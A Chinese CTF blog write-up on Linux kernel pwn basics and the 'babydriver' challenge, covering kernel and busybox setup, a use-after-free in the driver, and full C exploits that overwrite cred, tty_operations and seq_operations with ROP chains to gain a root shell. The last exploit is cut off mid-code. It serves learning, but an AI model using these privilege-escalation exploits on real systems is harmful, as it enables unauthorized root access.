# kernel-pwn-babydriver



## 总结

其实也做了不少的内核的`pwn`题，但是总结的博客自己没有写多少。一方面是因为博客写起来相对来说比价麻烦，而我又是一个比较懒的人......好吧，虽然这篇写的是`babaydriver`这道题目，但是会总结内核`pwn`入门的一些基础只是，以及很多利用手法。就是，对题目加上很多限制之后的利用手法分析。

<!-- more -->

## 基础知识

### kernel

一图胜千言：

![image-20220312203553985](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312203553985.png)

需要注意的是，`linux`内核是单内核。因此，内核基本拥有对系统绝对的控制权。而微内核架构中，内核其实只负责寻址、内存管理、进程通信等基础功能。

### 状态切换

在学习`SROP`的时候，介绍过一个系统调用`sigreturen`，该系统调用结束后，会恢复用户态栈，进而继续执行用户态代码。这里介绍一下在软中断场景下，内核与用户态发生的切换过程。还是先看图：

![image-20220312204038518](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312204038518.png)

图中所经历的过程为：

1. 内核代替进程接受信号，将信号放入对应进程的信号队列中，同时将进程标记为`suspend`状态，然后从用户态切换到内核态
2. 陷入内核态后，内核会将用户态的寄存器状态逐一保存起来，形成一个`ucontext`结构，然后压入信号信息和`sigreturn`代码。随后，进入内核内部的工作。
3. 若注册了信号处理函数，那么程序控制权会回到用户进程，然后进入到`signal handler`函数进行处理，处理完成后会执行栈上的指令，也就是`sigreturn`系统调用
4. 进程重新陷入内核，通过`sigreturen`恢复用户态上下文信息
5. 控制权返还给用户态进程，恢复寄存器等信息，继续在用户态执行



那么在用户态切换到内核态，具体的过程为：

1. 通过`swapgs`指令切换`GS`段寄存器
2. 将当前用户态的栈的栈顶记录到`CPU`的独占变量区域中，然后将该区域内的内核栈栈顶放入`rsp`
3. 通过`push`保存用户态的所有寄存器的值
4. 通过汇编指令判断是否为`x32_abi`
5. 通过系统调用号，跳转到全局变量`sys_table_table`相应的位置继续执行系统调用



在`linux-4.4.7`，目录`arch/x86/entry/entry_64.S`：

```assembly
ENTRY(entry_SYSCALL_64)
	/*
	 * Interrupts are off on entry.
	 * We do not frame this tiny irq-off block with TRACE_IRQS_OFF/ON,
	 * it is too small to ever cause noticeable irq latency.
	 */
	SWAPGS_UNSAFE_STACK
	/*
	 * A hypervisor implementation might want to use a label
	 * after the swapgs, so that it can do the swapgs
	 * for the guest and jump here on syscall.
	 */
GLOBAL(entry_SYSCALL_64_after_swapgs)
	; 存放用户态的rsp
	movq	%rsp, PER_CPU_VAR(rsp_scratch)
	; 把内核态的栈顶赋值给rsp
    movq	PER_CPU_VAR(cpu_current_top_of_stack), %rsp

	/* Construct struct pt_regs on stack */
    ; 保存各个寄存器的值
	pushq	$__USER_DS			/* pt_regs->ss */
	pushq	PER_CPU_VAR(rsp_scratch)	/* pt_regs->sp */
	/*
	 * Re-enable interrupts.
	 * We use 'rsp_scratch' as a scratch space, hence irq-off block above
	 * must execute atomically in the face of possible interrupt-driven
	 * task preemption. We must enable interrupts only after we're done
	 * with using rsp_scratch:
	 */
	ENABLE_INTERRUPTS(CLBR_NONE)
	pushq	%r11				/* pt_regs->flags */
	pushq	$__USER_CS			/* pt_regs->cs */
	pushq	%rcx				/* pt_regs->ip */
	pushq	%rax				/* pt_regs->orig_ax */
	pushq	%rdi				/* pt_regs->di */
	pushq	%rsi				/* pt_regs->si */
	pushq	%rdx				/* pt_regs->dx */
	pushq	%rcx				/* pt_regs->cx */
	pushq	$-ENOSYS			/* pt_regs->ax */
	pushq	%r8				/* pt_regs->r8 */
	pushq	%r9				/* pt_regs->r9 */
	pushq	%r10				/* pt_regs->r10 */
	pushq	%r11				/* pt_regs->r11 */
	sub	$(6*8), %rsp			/* pt_regs->bp, bx, r12-15 not saved */

	testl	$_TIF_WORK_SYSCALL_ENTRY, ASM_THREAD_INFO(TI_flags, %rsp, SIZEOF_PTREGS)
	jnz	tracesys
entry_SYSCALL_64_fastpath:
#if __SYSCALL_MASK == ~0
	cmpq	$__NR_syscall_max, %rax
#else
	andl	$__SYSCALL_MASK, %eax
	cmpl	$__NR_syscall_max, %eax
#endif
	ja	1f				/* return -ENOSYS (already in pt_regs->ax) */
	movq	%r10, %rcx
	; 跳转到sys_call_table去执行
	call	*sys_call_table(, %rax, 8)
```



而`pt_regs`结构体的定义为在`arch\x86\include\asm\ptrace.h`

```c
struct pt_regs {
/*
 * C ABI says these regs are callee-preserved. They aren't saved on kernel entry
 * unless syscall needs a complete, fully filled "struct pt_regs".
 */
	unsigned long r15;
	unsigned long r14;
	unsigned long r13;
	unsigned long r12;
	unsigned long rbp;
	unsigned long rbx;
/* These regs are callee-clobbered. Always saved on kernel entry. */
	unsigned long r11;
	unsigned long r10;
	unsigned long r9;
	unsigned long r8;
	unsigned long rax;
	unsigned long rcx;
	unsigned long rdx;
	unsigned long rsi;
	unsigned long rdi;
/*
 * On syscall entry, this is syscall#. On CPU exception, this is error code.
 * On hw interrupt, it's IRQ number:
 */
	unsigned long orig_rax;
/* Return frame for iretq */
	unsigned long rip;
	unsigned long cs;
	unsigned long eflags;
	unsigned long rsp;
	unsigned long ss;
/* top of stack page */
};
```

可以看到，在`rip`的上方，还有`cs`、`eflags`、`rsp`、`ss`。



从内核态切换为用户态的流程为：

1. 使用`swapgs`指令，切换`GS`段寄存器
2. 使用`iretq`或者`sysret`恢复到用户空间继续执行，需要注意的是如果使用`iretq`还需要恢复一些寄存器的值。还有一个`sysexit`指令也可以退出，但是该指令是`intel`独有的。

### 内核编译

内核编译，直接说步骤：

1. 从内核镜像源，国内推荐[清华源](https://mirrors.tuna.tsinghua.edu.cn/kernel/)下载，如下载`linux-4.4.7`版本的内核：

   ```
   curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v4.x/linux-4.4.7.tar.gz
   ```

2. 验证内核是否被篡改

3. 解压

4. `make menuconfig`，这里主要需要关注的是：

   ```
   Kernel hacking —-> Kernel debugging
   Kernel hacking —-> Compile-time checks and compiler options —-> Compile the kernel with debug info
   Kernel hacking —-> Generic Kernel Debugging Instruments —> KGDB: kernel debugger
   kernel hacking —-> Compile the kernel with frame pointers
   ```

   基本上不需要改动，直接保存退出即可。

5. `make -j8 bzImage`

编译结束后，在`arch/x86/boot/`目录下，有`bzImage`

### busybox编译

接着是编译`busybox`，制作一个简单的文件系统。步骤为：

1. 下载`wget https://busybox.net/downloads/busybox-1.32.1.tar.bz2`

2. 解压：`tar -jxf busybox-1.32.1.tar.bz2`

3. `make menuconfig`,主要关注：

   ```
   Settings -> Build static binary (no shared libs)
   Linux System Utilities -> Support mounting NFS file systems on Linux < 2.6.23 (NEW)
   Networking Utilities -> 取消选中 inetd
   ```

4. `make -j8`

5. `make install`

接下来做一些初始化操作：

```shell
cd _install
mkdir -pv {bin,sbin,etc,proc,sys,home,etc/init.d,lib64,lib/x86_64-linux-gnu,usr/{bin,sbin}}
touch etc/inittab
mkdir etc/init.d
touch etc/init.d/rcS
chmod +x ./etc/init.d/rcS
```

配置`etc/inttab`:

```
::sysinit:/etc/init.d/rcS
::askfirst:/bin/ash
::ctrlaltdel:/sbin/reboot
::shutdown:/sbin/swapoff -a
::shutdown:/bin/umount -a -r
::restart:/sbin/init
```

在根目录下创建`init`文件：

```
#!/bin/sh

mkdir -p /tmp

mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
mount -t debugfs none /sys/kernel/debug
mount -t tmpfs none /tmp


exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys
poweroff -d 0  -f
```

配置用户组：

```bash
echo "root:x:0:0:root:/root:/bin/sh" > etc/passwd
echo "ctf:x:1000:1000:ctf:/home/ctf:/bin/sh" >> etc/passwd
echo "root:x:0:" > etc/group
echo "ctf:x:1000:" >> etc/group
echo "none /dev/pts devpts gid=5,mode=620 0 0" > etc/fstab
```

配置动态链接库：

直接按照主机系统拷贝过去即可。



另外，在部署题目的时候，需要`insmod xxx.ko`

调试的时候，可以添加

```
setsid /bin/cttyhack setuidgid 0 /bin/sh
cat /proc/kallsyms > /tmp/kallsyms
cat /proc/modules > /tmp/modules
```



##  Babydriver

### 基本信息

获取`babydriver.ko`的基本信息：

![image-20220312224038051](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312224038051.png)

### 函数分析

#### ioctl

![image-20220312224343188](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312224343188.png)

注意这里的`babydev`是一个全局变量，首先会释放掉`device_buf`处的内存，然后重新分配，参数使用用户参进来的大小。

#### read

就是把信息拷贝给用户态指针

![image-20220312224502214](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312224502214.png)



#### write

也很常规：

![image-20220312224555808](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312224555808.png)

#### close

对应的是`release`函数：

会释放`device_buf`处的内容

![image-20220312224628497](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312224628497.png)

### 漏洞点

全局变量的访问不加锁，即是漏洞。可以`double free`和`use after free`。

### 利用方法

#### UAF cred结构体利用

该方法只在低版本的内核有效，高版本的特殊结构体的分配区间与普通映射区隔离开，所以子进程永远也无法分配到当前被释放的那个堆块。

本版本的内核还可以使用这种方法，因此，利用思路为：

- 打开两次`baabydev`
- 释放第一次
- 调用`fork`系统调用，得到子进程
- 通过第二次打开的句柄写，将其前`32`个字节刷为`0`
- 子进程调用`system("/bin/sh")`即可获得`root`的`shell`

结构体为：

```c
/* offset    |  size */  type = struct cred {
/*    0      |     4 */    atomic_t usage;
/*    4      |     4 */    kuid_t uid;
/*    8      |     4 */    kgid_t gid;
/*   12      |     4 */    kuid_t suid;
/*   16      |     4 */    kgid_t sgid;
/*   20      |     4 */    kuid_t euid;
/*   24      |     4 */    kgid_t egid;
/*   28      |     4 */    kuid_t fsuid;
/*   32      |     4 */    kgid_t fsgid;
/*   36      |     4 */    unsigned int securebits;
/*   40      |     8 */    kernel_cap_t cap_inheritable;
/*   48      |     8 */    kernel_cap_t cap_permitted;
/*   56      |     8 */    kernel_cap_t cap_effective;
/*   64      |     8 */    kernel_cap_t cap_bset;
/*   72      |     8 */    kernel_cap_t cap_ambient;
/*   80      |     1 */    unsigned char jit_keyring;
/* XXX  7-byte hole  */
/*   88      |     8 */    struct key *session_keyring;
/*   96      |     8 */    struct key *process_keyring;
/*  104      |     8 */    struct key *thread_keyring;
/*  112      |     8 */    struct key *request_key_auth;
/*  120      |     8 */    void *security;
/*  128      |     8 */    struct user_struct *user;
/*  136      |     8 */    struct user_namespace *user_ns;
/*  144      |     8 */    struct group_info *group_info;
/*  152      |    16 */    struct callback_head {
/*  152      |     8 */        struct callback_head *next;
/*  160      |     8 */        void (*func)(struct callback_head *);

                               /* total size (bytes):   16 */
                           } rcu;

                           /* total size (bytes):  168 */
                         }
```

![image-20220312232031701](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312232031701.png)



`exp`为：

```c
void baby_alloc(int fd, size_t size) {
    ioctl(fd, 0x10001, size);
}

// UAF 使用cred提权
void exp1()
{
    int fd1 = open(DEV_NAME, O_RDWR);
    int fd2 = open(DEV_NAME, O_RDWR);
    if (fd1 < 0 || fd2 < 0) {
        error("open error!");
    }
    baby_alloc(fd1, 0xa8); // sizeof(cred) == 0xa8
    close(fd1);
    pid_t child = fork();
    if (child < 0) {
        error("fork error!");
    } else if (child == 0) {
        // child
        char payload[32] = {0};
        write(fd2, &payload, 32);
        get_shell();
    } else {
        wait(NULL);
    }
    return 0;
}
```



#### UAF tty_operations结构体利用

在`open("/dev/ptmx")`的时候，会分配到一个结构体`tty_struct`：

```c
/* offset    |  size */  type = struct tty_struct {
/*    0      |     4 */    int magic;
/*    4      |     4 */    struct kref {
/*    4      |     4 */        atomic_t refcount;

                               /* total size (bytes):    4 */
                           } kref;
/*    8      |     8 */    struct device *dev;
/*   16      |     8 */    struct tty_driver *driver;
/*   24      |     8 */    const struct tty_operations *ops;
/*   32      |     4 */    int index;
/* XXX  4-byte hole  */
/*   40      |    48 */    struct ld_semaphore {
/*   40      |     8 */        long count;
/*   48      |     4 */        raw_spinlock_t wait_lock;
/*   52      |     4 */        unsigned int wait_readers;
/*   56      |    16 */        struct list_head {
/*   56      |     8 */            struct list_head *next;
/*   64      |     8 */            struct list_head *prev;

                                   /* total size (bytes):   16 */
                               } read_wait;
/*   72      |    16 */        struct list_head {
/*   72      |     8 */            struct list_head *next;
/*   80      |     8 */            struct list_head *prev;

                                   /* total size (bytes):   16 */
                               } write_wait;

                               /* total size (bytes):   48 */
                           } ldisc_sem;
/*   88      |     8 */    struct tty_ldisc *ldisc;
/*   96      |    40 */    struct mutex {
/*   96      |     4 */        atomic_t count;
/*  100      |     4 */        spinlock_t wait_lock;
/*  104      |    16 */        struct list_head {
/*  104      |     8 */            struct list_head *next;
/*  112      |     8 */            struct list_head *prev;

                                   /* total size (bytes):   16 */
                               } wait_list;
/*  120      |     8 */        struct task_struct *owner;
/*  128      |     4 */        struct optimistic_spin_queue {
/*  128      |     4 */            atomic_t tail;

                                   /* total size (bytes):    4 */
                               } osq;

                               /* total size (bytes):   40 */
                           } atomic_write_lock;
/*  136      |    40 */    struct mutex {
/*  136      |     4 */        atomic_t count;
/*  140      |     4 */        spinlock_t wait_lock;
/*  144      |    16 */        struct list_head {
/*  144      |     8 */            struct list_head *next;
/*  152      |     8 */            struct list_head *prev;

                                   /* total size (bytes):   16 */
                               } wait_list;
/*  160      |     8 */        struct task_struct *owner;
/*  168      |     4 */        struct optimistic_spin_queue {
/*  168      |     4 */            atomic_t tail;

                                   /* total size (bytes):    4 */
                               } osq;

                               /* total size (bytes):   40 */
                           } legacy_mutex;
/*  176      |    40 */    struct mutex {
/*  176      |     4 */        atomic_t count;
/*  180      |     4 */        spinlock_t wait_lock;
/*  184      |    16 */        struct list_head {
/*  184      |     8 */            struct list_head *next;
/*  192      |     8 */            struct list_head *prev;

                                   /* total size (bytes):   16 */
                               } wait_list;
/*  200      |     8 */        struct task_struct *owner;
/*  208      |     4 */        struct optimistic_spin_queue {
/*  208      |     4 */            atomic_t tail;

                                   /* total size (bytes):    4 */
                               } osq;

                               /* total size (bytes):   40 */
                           } throttle_mutex;
/*  216      |    40 */    struct rw_semaphore {
/*  216      |     8 */        long count;
/*  224      |    16 */        struct list_head {
/*  224      |     8 */            struct list_head *next;
/*  232      |     8 */            struct list_head *prev;

                                   /* total size (bytes):   16 */
                               } wait_list;
/*  240      |     4 */        raw_spinlock_t wait_lock;
/*  244      |     4 */        struct optimistic_spin_queue {
/*  244      |     4 */            atomic_t tail;

                                   /* total size (bytes):    4 */
                               } osq;
/*  248      |     8 */        struct task_struct *owner;

                               /* total size (bytes):   40 */
                           } termios_rwsem;
/*  256      |    40 */    struct mutex {
/*  256      |     4 */        atomic_t count;
/*  260      |     4 */        spinlock_t wait_lock;
/*  264      |    16 */        struct list_head {
/*  264      |     8 */            struct list_head *next;
/*  272      |     8 */            struct list_head *prev;

                                   /* total size (bytes):   16 */
                               } wait_list;
/*  280      |     8 */        struct task_struct *owner;
/*  288      |     4 */        struct optimistic_spin_queue {
/*  288      |     4 */            atomic_t tail;

                                   /* total size (bytes):    4 */
                               } osq;

                               /* total size (bytes):   40 */
                           } winsize_mutex;
/*  296      |     4 */    spinlock_t ctrl_lock;
/*  300      |     4 */    spinlock_t flow_lock;
/*  304      |    44 */    struct ktermios {
/*  304      |     4 */        tcflag_t c_iflag;
/*  308      |     4 */        tcflag_t c_oflag;
/*  312      |     4 */        tcflag_t c_cflag;
/*  316      |     4 */        tcflag_t c_lflag;
/*  320      |     1 */        cc_t c_line;
/*  321      |    19 */        cc_t c_cc[19];
/*  340      |     4 */        speed_t c_ispeed;
/*  344      |     4 */        speed_t c_ospeed;

                               /* total size (bytes):   44 */
                           } termios;
/*  348      |    44 */    struct ktermios {
/*  348      |     4 */        tcflag_t c_iflag;
/*  352      |     4 */        tcflag_t c_oflag;
/*  356      |     4 */        tcflag_t c_cflag;
/*  360      |     4 */        tcflag_t c_lflag;
/*  364      |     1 */        cc_t c_line;
/*  365      |    19 */        cc_t c_cc[19];
/*  384      |     4 */        speed_t c_ispeed;
/*  388      |     4 */        speed_t c_ospeed;

                               /* total size (bytes):   44 */
                           } termios_locked;
/*  392      |     8 */    struct termiox *termiox;
/*  400      |    64 */    char name[64];
/*  464      |     8 */    struct pid *pgrp;
/*  472      |     8 */    struct pid *session;
/*  480      |     8 */    unsigned long flags;
/*  488      |     4 */    int count;
/*  492      |     8 */    struct winsize {
/*  492      |     2 */        unsigned short ws_row;
/*  494      |     2 */        unsigned short ws_col;
/*  496      |     2 */        unsigned short ws_xpixel;
/*  498      |     2 */        unsigned short ws_ypixel;

                               /* total size (bytes):    8 */
                           } winsize;
/*  496:31   |     8 */    unsigned long stopped : 1;
/*  496:30   |     8 */    unsigned long flow_stopped : 1;
/* XXX  6-bit hole   */
/* XXX  3-byte hole  */
/*  504: 2   |     8 */    unsigned long unused : 62;
/* XXX  2-bit hole   */
/*  512      |     4 */    int hw_stopped;
/*  512:24   |     8 */    unsigned long ctrl_status : 8;
/*  512:23   |     8 */    unsigned long packet : 1;
/* XXX  7-bit hole   */
/* XXX  2-byte hole  */
/*  520: 9   |     8 */    unsigned long unused_ctrl : 55;
/* XXX  1-bit hole   */
/* XXX  1-byte hole  */
/*  528      |     4 */    unsigned int receive_room;
/*  532      |     4 */    int flow_change;
/*  536      |     8 */    struct tty_struct *link;
/*  544      |     8 */    struct fasync_struct *fasync;
/*  552      |     4 */    int alt_speed;
/* XXX  4-byte hole  */
/*  560      |    24 */    wait_queue_head_t write_wait;
/*  584      |    24 */    wait_queue_head_t read_wait;
/*  608      |    32 */    struct work_struct {
/*  608      |     8 */        atomic_long_t data;
/*  616      |    16 */        struct list_head {
/*  616      |     8 */            struct list_head *next;
/*  624      |     8 */            struct list_head *prev;

                                   /* total size (bytes):   16 */
                               } entry;
/*  632      |     8 */        work_func_t func;

                               /* total size (bytes):   32 */
                           } hangup_work;
/*  640      |     8 */    void *disc_data;
/*  648      |     8 */    void *driver_data;
/*  656      |    16 */    struct list_head {
/*  656      |     8 */        struct list_head *next;
/*  664      |     8 */        struct list_head *prev;

                               /* total size (bytes):   16 */
                           } tty_files;
/*  672      |     4 */    int closing;
/* XXX  4-byte hole  */
/*  680      |     8 */    unsigned char *write_buf;
/*  688      |     4 */    int write_cnt;
/* XXX  4-byte hole  */
/*  696      |    32 */    struct work_struct {
/*  696      |     8 */        atomic_long_t data;
/*  704      |    16 */        struct list_head {
/*  704      |     8 */            struct list_head *next;
/*  712      |     8 */            struct list_head *prev;

                                   /* total size (bytes):   16 */
                               } entry;
/*  720      |     8 */        work_func_t func;

                               /* total size (bytes):   32 */
                           } SAK_work;
/*  728      |     8 */    struct tty_port *port;

                           /* total size (bytes):  736 */
                         }
```

大小为`0x2e0`，在偏移为`24`的地方，有一个结构体`tty_operations`，存储着大量的函数指针：

```c
/* offset    |  size */  type = struct tty_operations {
/*    0      |     8 */    struct tty_struct *(*lookup)(struct tty_driver *, struct inode *, int);
/*    8      |     8 */    int (*install)(struct tty_driver *, struct tty_struct *);
/*   16      |     8 */    void (*remove)(struct tty_driver *, struct tty_struct *);
/*   24      |     8 */    int (*open)(struct tty_struct *, struct file *);
/*   32      |     8 */    void (*close)(struct tty_struct *, struct file *);
/*   40      |     8 */    void (*shutdown)(struct tty_struct *);
/*   48      |     8 */    void (*cleanup)(struct tty_struct *);
/*   56      |     8 */    int (*write)(struct tty_struct *, const unsigned char *, int);
/*   64      |     8 */    int (*put_char)(struct tty_struct *, unsigned char);
/*   72      |     8 */    void (*flush_chars)(struct tty_struct *);
/*   80      |     8 */    int (*write_room)(struct tty_struct *);
/*   88      |     8 */    int (*chars_in_buffer)(struct tty_struct *);
/*   96      |     8 */    int (*ioctl)(struct tty_struct *, unsigned int, unsigned long);
/*  104      |     8 */    long (*compat_ioctl)(struct tty_struct *, unsigned int, unsigned long);
/*  112      |     8 */    void (*set_termios)(struct tty_struct *, struct ktermios *);
/*  120      |     8 */    void (*throttle)(struct tty_struct *);
/*  128      |     8 */    void (*unthrottle)(struct tty_struct *);
/*  136      |     8 */    void (*stop)(struct tty_struct *);
/*  144      |     8 */    void (*start)(struct tty_struct *);
/*  152      |     8 */    void (*hangup)(struct tty_struct *);
/*  160      |     8 */    int (*break_ctl)(struct tty_struct *, int);
/*  168      |     8 */    void (*flush_buffer)(struct tty_struct *);
/*  176      |     8 */    void (*set_ldisc)(struct tty_struct *);
/*  184      |     8 */    void (*wait_until_sent)(struct tty_struct *, int);
/*  192      |     8 */    void (*send_xchar)(struct tty_struct *, char);
/*  200      |     8 */    int (*tiocmget)(struct tty_struct *);
/*  208      |     8 */    int (*tiocmset)(struct tty_struct *, unsigned int, unsigned int);
/*  216      |     8 */    int (*resize)(struct tty_struct *, struct winsize *);
/*  224      |     8 */    int (*set_termiox)(struct tty_struct *, struct termiox *);
/*  232      |     8 */    int (*get_icount)(struct tty_struct *, struct serial_icounter_struct *);
/*  240      |     8 */    int (*poll_init)(struct tty_driver *, int, char *);
/*  248      |     8 */    int (*poll_get_char)(struct tty_driver *, int);
/*  256      |     8 */    void (*poll_put_char)(struct tty_driver *, int, char);
/*  264      |     8 */    const struct file_operations *proc_fops;

                           /* total size (bytes):  272 */
                         }
```

而对打开的`/dev/pmtx`设备进行读写的时候，最后会调用该结构体中的函数指针，以`write`为例，调用链为：

- tty_write
  - do_tty_write
    - n_tty_write
      - tty->ops->write(tty, b, nr)

当然，前面会有一系列的校验。

此时的利用思路为：

- 打开两次`babydriver`，释放`1`次，释放前将`device_buf`的大小修改为`0x2e0`
- 打开`/dev/ptmx`设备
- 修改`tty_struct`的`tty_operations`处的指针，修改为用户态的栈地址。因为没有开启`smap`，所以是可以访问用户态的数据的。
- 使用`pop rsp;ret`将栈迁移到用户态栈上来
- 关闭`smep`，执行`commit_cred(prepare_cred(0))`，然后回到用户态执行`system('/bin/sh')`

`exp`如下：

```c
// 使用tty结构体 + ret2usr提权
void exp2()
{
    save_status();
    g_prepare_kernel_cred_addr = 0xffffffff810a1810;
    g_commit_creds_addr = 0xffffffff810a1420;

    int fd1 = open(DEV_NAME, O_RDWR);
    int fd2 = open(DEV_NAME, O_RDWR);
    if (fd1 < 0 || fd2 < 0) {
        error("open error!");
    }
    baby_alloc(fd1, 0x2e0); // sizeof(tty_struct) == 0x2e0
    close(fd1);
    int tty_fd = open("/dev/ptmx", 2);
    if (tty_fd < 0) {
        error("open /dev/ptmx error!");
    }
    /*
    0xffffffff8100008a : xchg eax, esp ; ret
    0xffffffff8181bfc5 : mov rsp, rax ; dec ebx ; ret
    0xffffffff81171045 : pop rsp ; ret
    0xffffffff81004d80 : mov cr4, rdi ; pop rbp ; ret
    0xffffffff810d238d : pop rdi ; ret
    0xffffffff81063694 : swapgs ; pop rbp ; ret
    0xffffffff814e35ef: iretq; ret;

    */
   size_t tmp = 0xdeadbeef;

    size_t rop_payload [] = {
        0xffffffff810d238d,  //pop rdi ; ret
        0x6f0,
        0xffffffff81004d80, // mov cr4, rdi ; pop rbp ; ret
        ((size_t)&tmp) + 0x1000, // rbp
        (size_t)&set_root_uid,
        0xffffffff81063694, ((size_t)&tmp) + 0x1000, // swapgs ; pop rbp ; ret
        0xffffffff814e35ef, // iretq; ret;
        (size_t)&get_shell,
        g_user_cs,
        g_user_eflags,
        g_user_sp,
        g_user_ss
    };

    // 准备好 tty_operations
    size_t fake_tty_operations [30] = {
        0xffffffff81171045, // pop rsp ret
        (size_t)rop_payload,
        0,0,0,0,0, 0xffffffff8181bfc5 // mov rsp, rax ; dec ebx ; ret
    };

    size_t fake_tty_struct[4] = {0};
    info("fake_tty_operations address: %p\tfake_tty_struct address: %p", fake_tty_operations, fake_tty_struct);

    // 修改 tty_operations
    read(fd2, fake_tty_struct, 0x20);
    show_addr_u64(fake_tty_struct, 0x20);
    fake_tty_struct[3] = (size_t)fake_tty_operations;
    write(fd2, fake_tty_struct, 0x20);
    show_addr_u64(fake_tty_struct, 0x20);
    write(tty_fd, fake_tty_struct, 0x20);
}
```



这里使用了`mov rsp, rax ; dec ebx ; ret`是因为，在`call tty->ops->write`的时候，实际的汇编指令是`call [rax+0x38]`

![image-20220313104929463](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220313104929463.png)



当然，由于只开启了`SMEP`而没有开启`SMAP`，因此可以在用户态的栈上去执行`commit_cred(prepare_cred(0))`，需要借助寄存器转移一下`rax`的值，并执行`call`语句而且返回。

此时的`exp`为：

```c
// 使用tty结构体 构造rop执行
void exp3()
{
    save_status();
    g_prepare_kernel_cred_addr = 0xffffffff810a1810;
    g_commit_creds_addr = 0xffffffff810a1420;

    int fd1 = open(DEV_NAME, O_RDWR);
    int fd2 = open(DEV_NAME, O_RDWR);
    if (fd1 < 0 || fd2 < 0) {
        error("open error!");
    }
    baby_alloc(fd1, 0x2e0); // sizeof(tty_struct) == 0x2e0
    close(fd1);
    int tty_fd = open("/dev/ptmx", 2);
    if (tty_fd < 0) {
        error("open /dev/ptmx error!");
    }
    /*
    0xffffffff8100008a : xchg eax, esp ; ret
    0xffffffff8181bfc5 : mov rsp, rax ; dec ebx ; ret
    0xffffffff81171045 : pop rsp ; ret
    0xffffffff81004d80 : mov cr4, rdi ; pop rbp ; ret
    0xffffffff810d238d : pop rdi ; ret
    0xffffffff81063694 : swapgs ; pop rbp ; ret
    0xffffffff814e35ef: iretq; ret;
    0xffffffff81246ab1: mov rdi, rax; call rcx; pop rbp; ret;
    0xffffffff8100700c: pop rcx; ret;
    */
   size_t tmp = 0xdeadbeef;


    size_t rop_payload [] = {
        0xffffffff810d238d,  //pop rdi ; ret
        0,
        g_prepare_kernel_cred_addr,
        0xffffffff8100700c,
        g_commit_creds_addr,
        0xffffffff81246ab1, ((size_t)&tmp) + 0x1000,
        0xffffffff81063694, ((size_t)&tmp) + 0x1000, // swapgs ; pop rbp ; ret
        0xffffffff814e35ef, // iretq; ret;
        (size_t)&get_shell,
        g_user_cs,
        g_user_eflags,
        g_user_sp,
        g_user_ss
    };
    // 准备好 tty_operations
    size_t fake_tty_operations [30] = {
        0xffffffff81171045, // pop rsp ret
        (size_t)rop_payload,
        0,0,0,0,0, 0xffffffff8181bfc5 // mov rsp, rax ; dec ebx ; ret
    };

    size_t fake_tty_struct[4] = {0};
    info("fake_tty_operations address: %p\tfake_tty_struct address: %p", fake_tty_operations, fake_tty_struct);

    // 修改 tty_operations
    read(fd2, fake_tty_struct, 0x20);
    show_addr_u64(fake_tty_struct, 0x20);
    fake_tty_struct[3] = (size_t)fake_tty_operations;
    write(fd2, fake_tty_struct, 0x20);
    show_addr_u64(fake_tty_struct, 0x20);
    write(tty_fd, fake_tty_struct, 0x20);
}
```



#### UAF seq_operations结构体利用

`seq_operations`的结构为：

```c
struct seq_operations {
    void * (*start) (struct seq_file *m, loff_t *pos);
    void (*stop) (struct seq_file *m, void *v);
    void * (*next) (struct seq_file *m, void *v, loff_t *pos);
    int (*show) (struct seq_file *m, void *v);
};
```

在`open("/proc/self/stat", 0)`的时候，会创建一个该结构体。然后，在`read(stat_fd, buf, size)`的时候，会调用`start`函数指针。所以，劫持该指针，有一次任意地址调用的机会，但是却没有办法控制其参数。

该方法，需要结合`swapgs_restore_regs_and_return_to_usermode`函数，控制其`r15、r14、r13、r12、rbp、rbx`等参数，然后劫持`start`处为`add rsp, xxx; ret`即可有内核`rop`的机会，可以在内核执行`commit_cred(prepare_cred(0))`或者`commit_cred(&init_cred)`，然后再栈迁移到用户态地址空间上，随后`swapgs`和`iretq`切回用户态执行`system('/bin/sh')`即可成功提权。不在用户态地址空间执行提权代码，是会遇到很神奇的问题；不在内核栈上切回用户态，是因为`rop`的长度可能不够。

需要使用`add rsp, xxx; ret`，是因为，用户栈切换到内核栈的时候，会`push`所有的寄存器保存在内核栈上，而且处于高地址。所以可以把`rsp`往上抬，就可以访问到原来已在用户态赋值好的寄存器。

`exp`：

```c
void exp_seq()
{
    save_status();
    g_prepare_kernel_cred_addr = 0xffffffff810a1810;
    g_commit_creds_addr = 0xffffffff810a1420;
    size_t init_cred_addr = 0xffffffff81e48c60;

    int fd1 = open(DEV_NAME, O_RDWR);
    int fd2 = open(DEV_NAME, O_RDWR);
    if (fd1 < 0 || fd2 < 0) {
        error("open error!");
    }
    baby_alloc(fd1, 0x20); // sizeof(seq_operation) 0x18
    close(fd1);
    int seq_fd = open("/proc/self/stat", O_RDONLY);
    if (seq_fd < 0) {
        error("open /proc/self/stat fail!");
    }

    size_t* buf = (size_t *)g_buffer+0x10000;
    int i = 0;
    // buf[i++] = 0xffffffff810d238d;
    // buf[i++] = init_cred_addr;
    // buf[i++] = g_commit_creds_addr;
    buf[i++] = 0xffffffff81063694;
    buf[i++] = ((size_t)buf) + 0x1000;
    buf[i++] = 0xffffffff814e35ef;
    buf[i++] = (size_t)&get_shell_ex;
    buf[i++] = g_user_cs;
    buf[i++] = g_user_eflags;
    buf[i++] = g_user_sp;
    buf[i++] = g_user_ss;


    // 0xffffffff816d749b: add rsp, 0x108; pop rbx; pop r12; pop rbp; ret; 
    // 0xffffffff81008f38: add rsp, 0x18; pop rbx; pop rbp; ret; 
    // 0xffffffff81171045: pop rsp; ret; 
    uint64_t payload[4] = {0xffffffff816d749b};
    write(fd2, payload, 0x8);
    size_t r15, r14, r13, r12, rbp, rbx, r11, r10, r9 ,r8, tmp;
    r15 = 0xffffffff81008f38;
    r14 = 0xffffffff81171045;
    r13 = g_commit_creds_addr;
